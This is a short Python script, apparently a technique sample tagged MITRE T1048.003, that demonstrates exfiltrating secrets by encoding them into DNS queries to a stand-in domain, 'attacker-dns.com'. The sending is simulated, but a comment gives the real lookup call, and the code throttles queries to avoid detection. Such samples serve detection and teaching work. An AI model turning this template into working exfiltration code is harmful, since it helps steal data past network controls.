#!/usr/bin/env python3
# Technique ID: T1048.003
# Name: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (DNS)
# Tactic: Exfiltration
# Platform: Any
# Severity: High
# Description: Encoding data in DNS queries to bypass firewalls that allow port 53.
# Source: "Applied Network Security Monitoring"

import base64
import os
import time

# Fake Domain controlled by attacker
DOMAIN = "attacker-dns.com"
FILE_TO_STEAL = "secrets.txt"

print(f"[*] Starting DNS Exfiltration to *.{DOMAIN}")

def exfil_data(data):
    # 1. Encode Data
    # DNS labels have length limits (63 chars). We keep chunks small (32 chars).
    encoded = base64.b32encode(data.encode()).decode().replace("=", "")
    chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
    
    for i, chunk in enumerate(chunks):
        # 2. Construct Query
        # Format: <chunk_id>.<data>.<domain>
        # Example: 1.MZXW6YTBOI......attacker-dns.com
        hostname = f"{i}.{chunk}.{DOMAIN}"
        
        print(f"[>] Querying: {hostname}")
        # 3. Transmit (Simulated)
        # In real scenario: socket.gethostbyname(hostname)
        time.sleep(0.5) # Throttling to avoid detection

# Simulate Data
secrets = "This is a super secret password string that needs to get out."
exfil_data(secrets)

print("[+] Exfiltration Complete.")
